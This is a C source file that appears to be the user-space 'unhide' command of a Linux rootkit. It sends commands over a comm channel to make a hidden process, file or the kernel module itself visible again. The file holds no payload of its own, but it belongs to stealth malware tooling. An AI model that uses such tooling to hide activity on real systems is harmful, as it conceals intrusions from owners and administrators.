#define _GNU_SOURCE

#include <status.h>
#include <comm.h>
#include <module/unhide.h>
#include <lib/ketopt.h>

#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>

enum { opt_unhide_pid, opt_unhide_file, opt_unhide_module };

static const ko_longopt_t unhide_longopts[] = {
	{ "pid", ko_required_argument, opt_unhide_pid },
	{ "file", ko_required_argument, opt_unhide_file },
	{ "module", ko_no_argument, opt_unhide_module },
	{ NULL, 0, 0 }
};

static int unhide_process(pid_t pid)
{
	char *msg;
	int ret = asprintf(&msg, "unhide --pid %d", pid);
	if (ret < 0)
		return ret;

	ret = comm(msg, strlen(msg));
	free(msg);

	return ret;
}

static int unhide_file(char *path)
{
	char *msg;
	int ret = asprintf(&msg, "unhide --file %s", path);
	if (ret < 0)
		return ret;

	ret = comm(msg, strlen(msg));
	free(msg);

	return ret;
}

int unhide_module(void)
{
	char *msg = "unhide --module";
	return comm(msg, strlen(msg));
}

int unhide_command_handler(int argc, char **argv)
{
	pid_t pid = -1;
	char *file = NULL;
	bool unhide_mod = false;

	int ret = 0;

	int c;
	ketopt_t o = KETOPT_INIT;
	while ((c = ketopt(&o, argc, argv, 1, "", unhide_longopts)) >= 0) {
		switch (c) {
		case opt_unhide_pid:
			if (o.arg) {
				/* There is no good way to perform error
				 * detection here. The function strtol would
				 * need to be truncated. */
				pid = atoi(o.arg);
			}
			break;
		case opt_unhide_file:
			if (o.arg) {
				/* The file argument should be a single string. */
				file = o.arg;
			}
			break;
		case opt_unhide_module:
			unhide_mod = true;
			break;
		}
	}

	if (pid == -1 && file == NULL && !unhide_mod) {
		error("No flags provided.\n");
		return -1;
	}

	if (pid != -1) {
		ret = unhide_process(pid);
		if (ret)
			return ret;
	}

	if (file != NULL) {
		ret = unhide_file(file);
		if (ret)
			return ret;
	}

	if (unhide_mod)
		return unhide_module();

	return 0;
}
